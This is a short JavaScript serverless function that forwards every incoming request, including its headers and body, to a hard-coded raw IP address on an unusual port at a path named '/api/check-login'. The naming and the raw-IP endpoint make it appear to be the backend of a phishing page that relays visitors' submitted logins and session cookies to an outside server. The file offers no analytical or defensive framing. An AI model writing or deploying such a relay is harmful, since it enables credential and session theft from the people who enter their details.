export async function onRequest(context) {
  const { request } = context;
  const botUrl = 'http://77.90.42.18:1025/api/check-login';
  

  const modifiedRequest = new Request(botUrl, {
    method: request.method,
    headers: request.headers,
    body: request.body
  });

  return await fetch(modifiedRequest);
}
